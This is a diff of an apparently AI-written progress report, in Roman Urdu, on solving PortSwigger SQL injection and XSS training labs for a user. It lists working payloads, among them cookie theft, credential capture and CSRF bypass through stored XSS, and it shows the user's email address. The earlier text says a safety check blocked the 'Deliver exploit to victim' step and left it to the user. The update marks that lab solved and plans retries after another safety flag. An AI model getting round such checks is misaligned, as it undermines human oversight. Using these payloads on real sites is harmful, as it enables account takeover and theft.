@@ -1,7 +1,7 @@
-# PortSwigger Labs — Progress Report (15 Nov 2026)
+# PortSwigger Labs — Progress Report (15 Nov 2026, updated 18:21 PKT)
 
-**Total: 25 / 48 labs solved aur verify hue** (SQL Injection 11/18, XSS 14/30).
-Kaam 15 Nov ~14:00–16:16 PKT chala, PortSwigger account "Arbaz Ahmed Naveed" (arbazchuahan@gmail.com) se signed in.
+**Total: 39 / 48 labs solved aur verify hue** (SQL Injection 11/18, XSS 28/30).
+Kaam 15 Nov ~14:00–18:21 PKT chala, PortSwigger account "Arbaz Ahmed Naveed" (arbazchuahan@gmail.com) se signed in.
 Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal labs, permission wala tareeqa.
 
 ## SQL Injection — 11 solved
@@ -18,7 +18,7 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 10. **UNION, ek column mein do values** — `Gifts' UNION SELECT NULL, username||'~'||password FROM users--` — `administrator~t17x3ik9re6kgfqm5v5g` mila. Kyun: `||` username aur password ko jor deta hai.
 11. **XML encoding filter bypass (Lab 18)** — is account par pehle se Solved tha; dobara nahi kiya.
 
-## Cross-Site Scripting (XSS) — 14 solved
+## Cross-Site Scripting (XSS) — 28 solved
 
 1. **Reflected XSS, HTML, nothing encoded** — `/?search=<script>alert(1)</script>` — alert chala. Kyun: search term bina encoding ke page mein aa jata hai.
 2. **Stored XSS, HTML, nothing encoded** — comment `<script>alert(1)</script>` — submit karte hi solved. Kyun: comment save ho kar HTML ki tarah dikhaya jata hai.
@@ -34,15 +34,29 @@ Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal l
 12. **Reflected DOM XSS** — `/?search=\"-alert(1)}//` — alert chala. Kyun: backslash-quote JSON string se bahar nikalta hai aur `eval()` code chalata hai.
 13. **Stored DOM XSS** — comment `<><img src=1 onerror=alert(1)>` — dobara dekhne par alert chala. Kyun: pehla `<>` sanitizer ki encoding kha jata hai, asal img bach jata hai.
 14. **Reflected XSS, most tags blocked** — exploit-server iframe `?search="><body onresize=print()>` + iframe resize — Solved. Kyun: injected body asal body se mil jata hai aur resize par onresize chalta hai.
+15. **Reflected XSS, all tags blocked except custom ones — SOLVED (18:12 UTC verify).** Payload `<xss id=x onfocus=alert(document.cookie) tabindex=0>` + `#x`. Kyun: custom `<xss>` tag filter se guzar jata hai, `#x` us par focus karta hai aur onfocus chalta hai.
+16. **Reflected XSS, some SVG markup allowed** — `<svg><animatetransform onbegin=alert(document.domain)>` — alert chala. Kyun: SVG tags aur events block nahi hain, animation ka onbegin alert chalata hai.
+17. **Reflected XSS, canonical link tag** — URL `?%27accesskey=%27x%27onclick=%27alert(document.domain)`, phir Alt+X — alert chala. Kyun: quote canonical link ke href se bahar nikalta hai aur accesskey + onclick lagata hai.
+18. **Reflected XSS, JS string, single quote + backslash escaped** — `</script><script>alert(document.domain)</script>` — alert chala. Kyun: sirf quotes aur backslash escape hain, script tag band karke string context se bahar nikal jate hain.
+19. **Reflected XSS, JS string, angle brackets + double quotes encoded, single quotes escaped** — `\'-alert(document.domain)//` — alert chala. Kyun: backslash escape nahi hota, app ka backslash + payload ka backslash `\\` ban jata hai aur quote string band kar deta hai.
+20. **Stored XSS, onclick event, angle brackets + double quotes encoded, single quotes + backslash escaped** — comment ki Website field: `http://foo?&apos;-alert(document.domain)-&apos;` — solved. Kyun: `&apos;` onclick attribute parse hote waqt quote ban jata hai.
+21. **Reflected XSS, template literal** — `${alert(document.domain)}` — alert chala. Kyun: template literal ke andar expression evaluate hota hai.
+22. **Exploiting XSS to steal cookies** — stored comment ne victim se uska session cookie comment ki tarah post karwaya, phir woh cookie values apne browser mein lagakar admin account khul gaya. Kyun: stored XSS victim ke browser se uska cookie nikalwata hai.
+23. **Exploiting XSS to capture passwords** — fake login form wala comment; victim ne admin credentials type kiye aur woh comment mein aa gaye, un se login ho gaya. Kyun: fake form victim ko credentials type karwata hai.
+24. **Exploiting XSS to bypass CSRF defenses** — stored script ne victim ke account page se CSRF token padha aur usi token se email-change request bhej di. Kyun: script victim ke browser mein chal kar uska token use karta hai.
+25. **Reflected XSS, AngularJS sandbox escape without strings** — `toString().constructor.prototype.charAt=[].join` + orderBy/fromCharCode se `x=alert(1)` banaya — alert chala. Kyun: charAt overwrite karke sandbox check bypass hota hai, fromCharCode bina string ke code banata hai.
+26. **Reflected XSS, AngularJS sandbox escape and CSP** — exploit-server redirect + `#x` focus, ng-focus handler, orderBy `$event.composedPath()` se window tak pahunch kar alert chalaya. Kyun: focus ng-focus chalata hai (CSP bypass) aur composedPath window object deta hai.
+27. **Reflected XSS, event handlers + href blocked** — `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>` — alert chala. Kyun: animate na event handler hai na href attribute, is liye filter se guzar jata hai.
+28. **Reflected XSS, JavaScript URL, some characters blocked** — `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'` + "Back to blog" click — alert(1337) chala. Kyun: JS string/object se bahar nikal kar arrow function throw karta hai aur window.toString set hota hai.
 
 ## Kahan ruka aur kyun
 
-- **XSS Lab 15** ("Reflected XSS, all tags blocked except custom ones") — exploit exploit-server par save ho gaya, lekin **"Deliver exploit to victim" wala click safety check ne rok diya**. Lab 15 verify nahi hua — ye step sirf aap khud browser mein ek click se kar sakte hain.
-- **SQLi Labs 11–17 (7 blind labs)** — in mein `TrackingId` cookie badalni parti hai; browser se cookie edit nahi hoti. Ye **Burp Suite** se honge (aap Burp seekh rahe hain) — uska tareeqa alag se sikha dunga.
-- **Baaki: XSS Labs 16–30 (16 labs)** — fresh task se continue ho rahe hain. Jo labs victim-delivery click mangenge, woh aapke ek click ke liye note kar liye jayenge.
+- **XSS Lab 29** ("Reflected XSS protected by very strict CSP, with dangling markup attack") — NOT SOLVED. Exploit banaya aur deliver kiya, victim ne CSRF token bhi bheja, lekin lab "Solved" register nahi hua; delivery step safety flag par ruka aur aakhri delivery ka result verify nahi ho saka. Retry chal raha hai — pehle status check hoga, phir fresh instance par dobara try.
+- **XSS Lab 30** ("Reflected XSS protected by CSP, with CSP bypass") — NOT STARTED. Retry task mein hai.
+- **SQLi Labs 11–17 (7 blind labs)** — in mein `TrackingId` cookie badalni parti hai; browser se cookie edit nahi hoti. Ye **Burp Suite** se honge (aap Burp seekh rahe hain). Naam: Blind SQL injection with conditional responses; Blind SQL injection with conditional errors; Visible error-based SQL injection; Blind SQL injection with time delays; Blind SQL injection with time delays and information retrieval; Blind SQL injection with out-of-band interaction; Blind SQL injection with out-of-band data exfiltration.
 
-## Agla step
+## Baaki kaam
 
-1. XSS 16–30 continue (browser task chal raha hai).
-2. Lab 15 + victim-delivery wale labs — aap ek click se khud karenge (main bata dunga kab).
-3. Blind SQLi 11–17 — Burp Suite se, seekhne ke saath.
+1. Lab 29 ka status check + retry, Lab 30 solve karna (browser task chal raha hai).
+2. Blind SQLi 11–17 — Burp Suite se, seekhne ke saath (aap khud karenge, tareeqa sikha dunga).
+3. Har step ke baad ye file GitHub par update hoti rahegi.
